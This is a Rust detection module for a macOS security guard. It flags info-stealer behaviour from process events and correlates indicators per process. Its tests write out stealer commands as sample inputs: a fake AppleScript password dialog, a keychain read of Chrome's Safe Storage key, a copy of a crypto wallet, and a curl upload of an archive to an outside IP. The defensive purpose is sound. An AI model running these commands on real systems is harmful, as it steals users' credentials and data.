//! Info-stealer behaviour rules (pure). Inputs are eslogger facts; outputs are indicators the guard turns
//! into alerts / kills. The rules target what every recent macOS stealer does (AMOS / Atomic, Poseidon,
//! Banshee, Cthulhu, Cuckoo, MacSync…): a fake password dialog through `osascript`, password validation with
//! `dscl -authonly`, the Chrome "Safe Storage" key or the whole keychain through `security`, copies of the
//! browser / keychain / wallet stores into a staging folder, then a `curl` upload of the archive.

use pb_core::model::Severity;
use pb_monitor::sensitive;
use std::collections::{HashMap, VecDeque};
use std::path::Path;
use std::time::{Duration, Instant};

/// What one event revealed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum IndicatorKind {
    /// `osascript` dialog with a hidden answer: phishing for the session password.
    FakePasswordPrompt,
    /// `security find-generic-password … Safe Storage` / `dump-keychain`.
    KeychainDump,
    /// `dscl … -authonly`: checking a captured password.
    PasswordCheck,
    /// A command-line tool reading / copying a credential store.
    CredentialAccess,
    /// A credential-store file created outside its application's folder.
    CredentialStaging,
    /// `curl` sending a local file.
    Exfiltration,
    /// `spctl --master-disable`: Gatekeeper turned off.
    GatekeeperDisabled,
    /// `killall Terminal` (hides the stealer's own terminal window).
    TerminalKilled,
    /// `openssl enc -aes…` run by a non-interactive process.
    FileEncryption,
}

impl IndicatorKind {
    pub fn id(self) -> &'static str {
        match self {
            IndicatorKind::FakePasswordPrompt => "fake_password_prompt",
            IndicatorKind::KeychainDump => "keychain_dump",
            IndicatorKind::PasswordCheck => "password_check",
            IndicatorKind::CredentialAccess => "credential_access",
            IndicatorKind::CredentialStaging => "credential_staging",
            IndicatorKind::Exfiltration => "exfiltration",
            IndicatorKind::GatekeeperDisabled => "gatekeeper_disabled",
            IndicatorKind::TerminalKilled => "terminal_killed",
            IndicatorKind::FileEncryption => "file_encryption",
        }
    }

    /// Severity when seen alone (`None`: only used as corroborating evidence).
    pub fn base_severity(self) -> Option<Severity> {
        match self {
            IndicatorKind::FakePasswordPrompt | IndicatorKind::KeychainDump => {
                Some(Severity::Critical)
            }
            IndicatorKind::CredentialStaging
            | IndicatorKind::CredentialAccess
            | IndicatorKind::GatekeeperDisabled => Some(Severity::High),
            IndicatorKind::PasswordCheck | IndicatorKind::Exfiltration => Some(Severity::Medium),
            IndicatorKind::TerminalKilled | IndicatorKind::FileEncryption => None,
        }
    }

    /// Kill the tool process itself (the dialog / the dump) on detection.
    pub fn kills_tool(self) -> bool {
        matches!(
            self,
            IndicatorKind::FakePasswordPrompt
                | IndicatorKind::KeychainDump
                | IndicatorKind::Exfiltration
        )
    }

    pub fn title(self) -> &'static str {
        match self {
            IndicatorKind::FakePasswordPrompt => "Fausse demande de mot de passe",
            IndicatorKind::KeychainDump => "Lecture du trousseau de clés",
            IndicatorKind::PasswordCheck => "Vérification de votre mot de passe par un programme",
            IndicatorKind::CredentialAccess => "Accès aux mots de passe / cookies du navigateur",
            IndicatorKind::CredentialStaging => {
                "Copie des données sensibles du navigateur ou du trousseau"
            }
            IndicatorKind::Exfiltration => "Envoi d'un fichier local vers Internet",
            IndicatorKind::GatekeeperDisabled => "Gatekeeper désactivé par un programme",
            IndicatorKind::TerminalKilled => "Fermeture forcée du Terminal",
            IndicatorKind::FileEncryption => "Chiffrement de fichiers en ligne de commande",
        }
    }

    pub fn explanation(self) -> &'static str {
        match self {
            IndicatorKind::FakePasswordPrompt => {
                "Une boîte de dialogue AppleScript demande un mot de passe masqué : c'est la technique des \
                 voleurs de données macOS (AMOS, Poseidon, Banshee…) pour obtenir votre mot de passe de session. \
                 Ne le saisissez jamais dans ce type de fenêtre."
            }
            IndicatorKind::KeychainDump => {
                "Un programme lit la clé de chiffrement des mots de passe du navigateur (« Safe Storage ») ou \
                 exporte le trousseau."
            }
            IndicatorKind::PasswordCheck => {
                "Un programme teste un mot de passe de session avec dscl -authonly (validation d'un mot de \
                 passe volé)."
            }
            IndicatorKind::CredentialAccess => {
                "Un outil en ligne de commande lit ou copie les bases de mots de passe, cookies ou portefeuilles \
                 crypto."
            }
            IndicatorKind::CredentialStaging => {
                "Une copie d'une base de mots de passe, de cookies, du trousseau ou d'un portefeuille crypto \
                 vient d'être créée hors de son dossier d'origine (préparation d'un vol)."
            }
            IndicatorKind::Exfiltration => "curl envoie un fichier local vers un serveur.",
            IndicatorKind::GatekeeperDisabled => {
                "La vérification des applications (Gatekeeper) a été désactivée."
            }
            IndicatorKind::TerminalKilled => "Le Terminal a été fermé de force.",
            IndicatorKind::FileEncryption => "Des fichiers sont chiffrés avec openssl.",
        }
    }
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// Rule for an `exec` (tool path + argv).
pub fn exec_indicator(tool_path: &str, args: &[String]) -> Option<IndicatorKind> {
    let name = basename(tool_path);
    let a = sensitive::joined_args(args);
    match name {
        "osascript" if a.contains("hidden answer") || a.contains("hiddenanswer") => {
            Some(IndicatorKind::FakePasswordPrompt)
        }
        "security" => {
            let reads_secret = (a.contains("find-generic-password")
                || a.contains("find-internet-password"))
                && args.iter().skip(2).any(|x| {
                    x.len() >= 2
                        && x.starts_with('-')
                        && !x.starts_with("--")
                        && x[1..].bytes().all(|b| b.is_ascii_alphabetic())
                        && (x.contains('w') || x.contains('g'))
                });
            let browser_key = a.contains("safe storage")
                || [
                    "chrome", "chromium", "brave", "edge", "opera", "vivaldi", "arc", "yandex",
                ]
                .iter()
                .any(|b| args.iter().any(|x| x.eq_ignore_ascii_case(b)));
            let dumps = a.contains("dump-keychain")
                || (reads_secret && browser_key)
                || (a.contains(" export ") && a.contains("keychain"));
            dumps.then_some(IndicatorKind::KeychainDump)
        }
        "dscl" if a.contains("-authonly") => Some(IndicatorKind::PasswordCheck),
        "spctl" if a.contains("--master-disable") || a.contains("--global-disable") => {
            Some(IndicatorKind::GatekeeperDisabled)
        }
        "killall" if a.split_whitespace().any(|t| t == "terminal") => {
            Some(IndicatorKind::TerminalKilled)
        }
        "curl" if sensitive::is_upload(args) => Some(IndicatorKind::Exfiltration),
        "openssl" if a.contains("enc ") => Some(IndicatorKind::FileEncryption),
        "sqlite3" | "cp" | "ditto" | "zip" | "tar" | "cat" | "base64" | "rsync" | "scp"
            if sensitive::args_touch_sensitive(&a) =>
        {
            Some(IndicatorKind::CredentialAccess)
        }
        _ => None,
    }
}

/// Rule for a created / renamed file.
pub fn file_indicator(path: &Path) -> Option<IndicatorKind> {
    (sensitive::is_sensitive_file_name(path) && !sensitive::is_legit_store_location(path))
        .then_some(IndicatorKind::CredentialStaging)
}

/// Correlates indicators per actor (the non-Apple process behind them) over a time window.
#[derive(Debug)]
pub struct Correlator {
    window: Duration,
    by_actor: HashMap<i32, VecDeque<(Instant, IndicatorKind)>>,
}

/// Correlation verdict for one new indicator.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Correlation {
    /// Distinct indicator kinds seen for this actor in the window (this one included), sorted by id.
    pub kinds: Vec<IndicatorKind>,
    /// Two or more distinct stealer behaviours: treat as a confirmed stealer.
    pub confirmed: bool,
}

impl Correlator {
    pub fn new(window: Duration) -> Self {
        Self {
            window,
            by_actor: HashMap::new(),
        }
    }

    pub fn record(&mut self, actor: i32, kind: IndicatorKind, now: Instant) -> Correlation {
        if self.by_actor.len() > 4096 {
            self.by_actor.clear();
        }
        let q = self.by_actor.entry(actor).or_default();
        while q
            .front()
            .is_some_and(|(t, _)| now.duration_since(*t) > self.window)
        {
            q.pop_front();
        }
        if q.len() < 256 {
            q.push_back((now, kind));
        }
        let mut kinds: Vec<IndicatorKind> = Vec::new();
        for (_, k) in q.iter() {
            if !kinds.contains(k) {
                kinds.push(*k);
            }
        }
        kinds.sort_by_key(|k| k.id());
        let strong = kinds.iter().filter(|k| k.base_severity().is_some()).count();
        Correlation {
            confirmed: kinds.len() >= 2 && strong >= 1,
            kinds,
        }
    }
}

/// Paths of interactive programs: an indicator whose ancestry reaches one of them was typed by a person
/// (alert, never kill).
/// Script interpreters and shells: the process running a malicious script may be killed, but the
/// interpreter binary itself (Homebrew `python3`, `node`, `bash`…) is shared by every script and is never
/// quarantined.
pub fn is_interpreter(path: &str) -> bool {
    let name = path.rsplit('/').next().unwrap_or(path).to_ascii_lowercase();
    let base = name.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
    matches!(
        base,
        "python"
            | "pypy"
            | "perl"
            | "ruby"
            | "node"
            | "nodejs"
            | "deno"
            | "bun"
            | "php"
            | "lua"
            | "luajit"
            | "tclsh"
            | "wish"
            | "rscript"
            | "java"
            | "pwsh"
            | "osascript"
            | "bash"
            | "zsh"
            | "sh"
            | "dash"
            | "ksh"
            | "fish"
            | "tcsh"
            | "csh"
            | "nu"
    )
}

pub fn is_interactive_host(path: &str) -> bool {
    const HOSTS: &[&str] = &[
        "/System/Applications/Utilities/Terminal.app/",
        "/Applications/iTerm.app/",
        "/Applications/Warp.app/",
        "/Applications/Ghostty.app/",
        "/Applications/Alacritty.app/",
        "/Applications/kitty.app/",
        "/Applications/WezTerm.app/",
        "/Applications/Visual Studio Code.app/",
        "/Applications/Cursor.app/",
        "/usr/sbin/sshd",
        "/usr/libexec/sshd-session",
    ];
    HOSTS
        .iter()
        .any(|h| path.starts_with(h) || path == h.trim_end_matches('/'))
}

/// Apple system locations (never killed, never treated as the actor).
pub fn is_system_path(path: &str) -> bool {
    [
        "/System/",
        "/usr/bin/",
        "/usr/sbin/",
        "/usr/libexec/",
        "/bin/",
        "/sbin/",
        "/Library/Apple/",
    ]
    .iter()
    .any(|p| path.starts_with(p))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn interpreters() {
        for p in [
            "/opt/homebrew/bin/python3",
            "/opt/homebrew/Cellar/python@3.13/3.13.1/bin/python3.13",
            "/usr/local/bin/node",
            "/bin/bash",
            "/opt/homebrew/bin/ruby",
        ] {
            assert!(is_interpreter(p), "{p}");
        }
        for p in [
            "/private/tmp/locker",
            "/Applications/Stealer.app/Contents/MacOS/Stealer",
            "/usr/bin/curl",
        ] {
            assert!(!is_interpreter(p), "{p}");
        }
    }

    fn v(a: &[&str]) -> Vec<String> {
        a.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn amos_like_sequence() {
        assert_eq!(
            exec_indicator(
                "/usr/bin/osascript",
                &v(&[
                    "osascript",
                    "-e",
                    "set r to display dialog \"Required Application Helper. Please enter password for continue.\" default answer \"\" with icon caution buttons {\"Continue\"} default button \"Continue\" giving up after 150 with title \"System Preferences\" with hidden answer"
                ])
            ),
            Some(IndicatorKind::FakePasswordPrompt)
        );
        assert_eq!(
            exec_indicator(
                "/usr/bin/dscl",
                &v(&["dscl", "/Local/Default", "-authonly", "q", "hunter2"])
            ),
            Some(IndicatorKind::PasswordCheck)
        );
        assert_eq!(
            exec_indicator(
                "/usr/bin/security",
                &v(&["security", "find-generic-password", "-ga", "Chrome"])
            ),
            Some(IndicatorKind::KeychainDump)
        );
        assert_eq!(
            exec_indicator(
                "/usr/bin/security",
                &v(&[
                    "security",
                    "find-generic-password",
                    "-w",
                    "-s",
                    "Chrome Safe Storage"
                ])
            ),
            Some(IndicatorKind::KeychainDump)
        );
        assert_eq!(
            exec_indicator(
                "/usr/bin/security",
                &v(&["security", "find-generic-password", "-s", "com.example.app"])
            ),
            None
        );
        assert_eq!(
            exec_indicator(
                "/usr/bin/ditto",
                &v(&[
                    "ditto",
                    "-c",
                    "-k",
                    "--sequesterRsrc",
                    "/Users/q/Library/Application Support/Exodus/exodus.wallet",
                    "/tmp/w.zip"
                ])
            ),
            Some(IndicatorKind::CredentialAccess)
        );
        assert_eq!(
            exec_indicator(
                "/usr/bin/curl",
                &v(&[
                    "curl",
                    "-X",
                    "POST",
                    "-H",
                    "user: x",
                    "--max-time",
                    "300",
                    "-F",
                    "file=@/tmp/out.zip",
                    "http://198.51.100.9/contact"
                ])
            ),
            Some(IndicatorKind::Exfiltration)
        );
        assert_eq!(
            exec_indicator("/usr/bin/killall", &v(&["killall", "Terminal"])),
            Some(IndicatorKind::TerminalKilled)
        );
        assert_eq!(exec_indicator("/bin/cp", &v(&["cp", "a", "b"])), None);
    }

    #[test]
    fn staging_files() {
        assert_eq!(
            file_indicator(Path::new("/private/tmp/2984/Chromium/Chrome/Login Data")),
            Some(IndicatorKind::CredentialStaging)
        );
        assert_eq!(
            file_indicator(Path::new(
                "/Users/q/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies"
            )),
            None
        );
        assert_eq!(
            file_indicator(Path::new("/Users/q/Documents/notes.txt")),
            None
        );
    }

    #[test]
    fn correlation_confirms_two_behaviours() {
        let mut c = Correlator::new(Duration::from_secs(600));
        let t0 = Instant::now();
        let r = c.record(100, IndicatorKind::TerminalKilled, t0);
        assert!(!r.confirmed);
        let r = c.record(
            100,
            IndicatorKind::FakePasswordPrompt,
            t0 + Duration::from_secs(5),
        );
        assert!(r.confirmed);
        assert_eq!(r.kinds.len(), 2);
        // Another actor is independent; old events expire.
        assert!(!c.record(200, IndicatorKind::Exfiltration, t0).confirmed);
        let r = c.record(
            100,
            IndicatorKind::Exfiltration,
            t0 + Duration::from_secs(1000),
        );
        assert!(!r.confirmed && r.kinds == vec![IndicatorKind::Exfiltration]);
    }

    #[test]
    fn hosts_and_system_paths() {
        assert!(is_interactive_host(
            "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"
        ));
        assert!(is_interactive_host("/usr/sbin/sshd"));
        assert!(!is_interactive_host("/private/tmp/payload"));
        assert!(
            is_system_path("/usr/bin/osascript")
                && !is_system_path("/Applications/Foo.app/Contents/MacOS/Foo")
        );
    }
}
